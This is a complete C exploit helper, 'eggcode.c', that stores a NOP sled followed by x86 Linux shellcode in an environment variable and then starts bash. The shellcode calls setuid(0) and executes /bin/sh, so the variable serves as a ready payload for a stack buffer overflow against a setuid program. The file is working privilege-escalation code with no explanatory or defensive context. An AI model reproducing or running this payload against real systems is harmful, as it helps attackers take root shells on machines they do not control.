/* eggcode.c */
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define NOP 0x90

char shellcode[] =
        "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55"
                "\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80"
                "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e"
                "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
                "\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

int main(void)
{
  char shell[512];
  memset(shell,NOP,512);     /* fill-up the buffer with NOP */
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  setenv("MYS", shell, 1);
  putenv(shell);
  system("bash");
  return 0;
}
